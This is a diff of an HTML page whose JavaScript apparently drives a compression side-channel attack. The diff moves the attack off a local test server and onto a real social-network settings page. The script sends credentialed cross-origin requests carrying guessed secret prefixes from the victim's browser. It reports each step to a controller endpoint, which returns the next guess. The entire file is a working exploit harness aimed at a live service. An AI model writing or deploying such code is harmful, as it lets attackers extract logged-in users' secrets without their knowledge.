@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <body>
 	<script>
@@ -5,6 +6,7 @@
 	var xmlhttp;
 	var xmlhttp2;
 	currentRequest = "";
+	currentRequestIndex = -1;
 	tempdictionary = "";
 	prefix = "";
 
@@ -20,14 +22,23 @@
 	}
 
 
-	xmlhttp=new XMLHttpRequest();
+	
+
+
 		//xmlhttp.onreadystatechange = RecieveResponse;
 
 	//document.write("Priming the pump" + "<BR>");
 	
-	var site = location.protocol + "//" + location.hostname + ":8086/?val=SecretVal=";  //target url
+	//var site = location.protocol + "//" + location.hostname + ":8086/?val=SecretVal=";  //target url
+	//var site = 'https://www.facebook.com/help/community';
+	//xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	
+	xmlhttp=new XMLHttpRequest();
+	var site = 'https://www.facebook.com/settings?';  //target url
 	xmlhttp.open("GET", site ,true);
+	xmlhttp.withCredentials = true; //after open for IE10 bug
 	xmlhttp.send(null);
+
 	sleep(1500);
 
 
@@ -43,15 +54,24 @@
 		document.write("Requesting:" + value + "<BR>");
 		
 		//var site= "http://127.0.0.1:8888/?val="; 
-		var site = location.protocol + "//" + location.hostname + ":8086/?val=SecretVal=";  //target url
+		//var site = location.protocol + "//" + location.hostname + ":8086/?val=SecretVal=";  //target url
+		var site = 'https://www.facebook.com/settings?';  //target url
+		//var site ='https://www.facebook.com/help/community';
 		var URL = site + prefix + value;
+		
+		//xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); //Change to dynamically load image
+		
+		//for(i = 1; i <= iterations; i++)
+		//{
 		xmlhttp.open("GET", URL ,true);
+		xmlhttp.withCredentials = true; //after open for IE10 bug
 		xmlhttp.send(null);
+		//}	
 		
 		sleep(500); //some sort of timing issue with getn
 
 		//if (requestCount < 4)
-			GetNewRequest(value);
+		GetNewRequest(value);
 		//requestCount++;
 	}
 
@@ -89,6 +109,7 @@
 			ojson = JSON.parse(xmlhttp2.responseText);
 
 			currentRequest = ojson['next'];
+			currentRequestIndex = ojson['nextIndex']
 			prefix = ojson['prefix'];
 			tempdictionary = ojson['tempdictionary'];
 
@@ -126,13 +147,14 @@
 		*/
 
 		
-		var site= location.protocol + "//" + location.host + "/next"; 
+		//var site= location.protocol + "//" + location.host + "/next"; 
+		var site= "https:" + "//" + "www.facebook.com:8888" + "/next";
 		//var URL = site;
 
 		
 
 		xmlhttp2.open("POST", site ,true);
-		xmlhttp2.send(JSON.stringify({"last": currentRequest,"tempdictionary": tempdictionary, "prefix": prefix}));
+		xmlhttp2.send(JSON.stringify({"last": currentRequest, "lastIndex": currentRequestIndex, "tempdictionary": tempdictionary, "prefix": prefix}));
 		
 
 	}
